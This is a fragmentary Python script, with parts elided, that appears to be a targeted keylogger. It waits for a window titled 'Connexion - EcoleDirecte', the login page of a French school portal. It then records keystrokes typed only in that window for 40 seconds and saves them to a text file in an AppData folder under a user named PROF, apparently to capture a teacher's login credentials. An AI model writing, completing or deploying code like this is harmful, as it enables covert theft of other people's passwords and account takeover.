...
# === CONFIG ===
TARGET_KEYWORD = "Connexion - EcoleDirecte"
LOG_DURATION = 40  # seconds
SAVE_PATH = r"C:\Users\PROF\AppData\Local\py"
FILENAME = "inputslog.txt"
...
def listener_thread():
    ...
    def on_press(key):
        ...
        if TARGET_KEYWORD.lower() not in current_title:
            return  # ignore input from other windows
...
def main():
    print("Waiting for target window...")
    while TARGET_KEYWORD.lower() not in get_active_window_title().lower():
        time.sleep(1)

    print("Target window found. Waiting for first key press...")
    listener_thread()
